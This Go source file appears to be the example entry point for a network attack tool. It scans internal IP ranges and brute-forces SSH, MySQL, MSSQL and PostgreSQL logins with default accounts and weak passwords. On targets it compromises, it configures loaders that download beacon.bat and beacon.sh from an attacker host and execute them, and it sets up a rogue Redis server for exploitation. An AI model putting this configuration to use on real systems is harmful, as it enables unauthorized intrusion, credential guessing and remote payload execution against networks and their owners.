package main

import (
	"context"
	"fmt"
	"strings"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/common/queue"
	"github.com/404tk/lazyscan/runner"
)

func main() {
	options := &runner.Options{
		Host:     "172.16.61.2,172.16.61.3", // 扫描目标
		NoPing:   false,                     // 不探活直接扫
		Scantype: "",                        // 默认扫描全部，可指定服务名称
		Timeout:  3,
		Threads:  600,
		LiveTop:  10,
		Downloader: common.Downloader{
			WinHTTP: common.Loader{
				Addr:        "http://192.168.1.2:8080/beacon.bat",
				FileName:    "beacon.bat",
				ExecCommand: "beacon.bat",
			},
			UnixHTTP: common.Loader{
				Addr:        "http://192.168.1.2:8080/beacon.sh", // 文件下载地址
				FileName:    "beacon.sh",                         // 文件缓存名称，默认路径为/tmp/
				ExecCommand: "beacon.sh",                         // 文件执行命令，可以添加参数
			},
			UnixTCP: common.Loader{
				Addr:        "192.168.1.2:8553/beacon.sh", // TCP文件下载地址
				FileName:    "beacon.sh",
				ExecCommand: "beacon.sh",
			},
		},
		RedisListen:      false,              // 是否运行时开启RedisRogueServer监听
		RedisRogueServer: "192.168.1.2:6380", // 监听IP+监听端口，支持外部监听
		Userdict: map[string][]string{
			"mysql":      {"root"},
			"ssh":        {"root"},
			"mssql":      {"sa"},
			"postgresql": {"postgres"},
		},
		Passwords: []string{"123456", "{user}", "{user}@123"},
		PortList: map[string]string{
			"ssh":           "22",
			"mssql":         "1433",
			"docker-remote": "2375",
			"etcd":          "2379",
			"mysql":         "3306",
			"postgresql":    "5432",
			"redis":         "6379",
			"kube-api":      "6443",
		},
		Accounts: []string{"admin/123456", "test/test", "/"},
	}
	resultQueue := queue.NewQueue() // 扫描结果队列
	r, err := runner.New(options)
	if err != nil {
		return
	}
	result := r.Run(context.TODO(), resultQueue)
	// ICMP存活IP，不启用探活则默认全部存活，进一步扫描端口
	fmt.Println("AliveHosts:", strings.Join(result.AliveHosts, ", "))
	// 开放端口
	fmt.Println("AlivePorts:", strings.Join(result.AlivePorts, ", "))
	// 漏洞结果汇总
	vulns := resultQueue.Dump()
	for _, v := range vulns {
		res := v.(common.Vuln)
		fmt.Println(res)
	}
}
